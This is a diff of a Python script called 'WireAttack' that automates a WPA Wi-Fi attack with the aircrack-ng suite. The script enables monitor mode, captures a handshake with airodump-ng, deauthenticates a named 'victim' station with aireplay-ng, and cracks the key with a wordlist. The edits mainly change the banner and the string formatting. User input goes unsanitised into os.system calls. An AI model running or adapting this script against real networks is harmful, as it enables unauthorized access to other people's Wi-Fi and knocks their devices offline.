@@ -1,41 +1,44 @@
 import os
 import time
+import pyfiglet
+
+banner = pyfiglet.figlet_format("WireAttack")
 
 enter = "\n"
 
-print("""________________________________________________________________________________________________________________________
+print("""{0}
+            *** The Tool Was Created By Idan Malihi ***{1}""".format(banner,enter))
 
-                            * The Tool Created By Idan - TraiLeR *
-                            
-________________________________________________________________________________________________________________________""")
+print("Set up the adapter{0}".format(enter))
 
-print(f"Set up the adapter{enter}")
+try:
+    adapter = input("Enter your adapter's name > ")
+    print("{0}Checking if there are any problematic PPID........................... (Press Enter){0}".format(enter))
 
-adapter = input("Enter your adapter's name > ")
+    os.system("kill all")
+    print("All PPID have been deleted.{0}".format(enter))
+    
+    print("Let's Enable Monitor Mode!{0}".format(enter))
+    os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
+    print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))
 
-print(f"{enter}Checking if there are any problematic PPID........................... (Press Enter){enter}")
+    print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
 
-os.system("kill all")
-print(f"All PPID have been deleted.{enter}")
+    time.sleep(5)
 
-print(f"Let's Enable Monitor Mode!{enter}")
-os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
-print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))
+    os.system("airodump-ng {0}".format(adapter))
 
-print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")
-
-time.sleep(5)
-
-os.system("airodump-ng {0}".format(adapter))
+except:
+    print("Your adapter's name does not exist, please check with 'iwconfig' command.")
 
 bssid_name = input("Enter BSSID Name > ")
-channel = input(f"{enter}Enter channel > ")
-bssid = input(f"{enter}Enter BSSID > ")
+channel = input("{0}Enter channel > ".format(enter))
+bssid = input("{0}Enter BSSID > ".format(enter))
 
-os.system("gnome-terminal -- airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
+os.system("airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
 time.sleep(5)
 
-print(f"PCAP file saved in /root/Desktop{enter}")
+print("PCAP file saved in /root/Desktop{0}".format(enter))
 
 packets = int(input("Enter Number of Attacks (10-100) > "))
 victim = input("Enter Victim's Station > ")
@@ -45,7 +48,7 @@ os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packets, bssid, vi
 time.sleep(5)
 
 pcap_file_path = input("Enter PCAP File Path > ")
-wordlist_path = input(f"{enter}Enter Wordlist Path > ")
+wordlist_path = input("{0}Enter Wordlist Path > ".format(enter))
 
 os.system("aircrack-ng -w {0} {1}".format(wordlist_path, pcap_file_path))
 
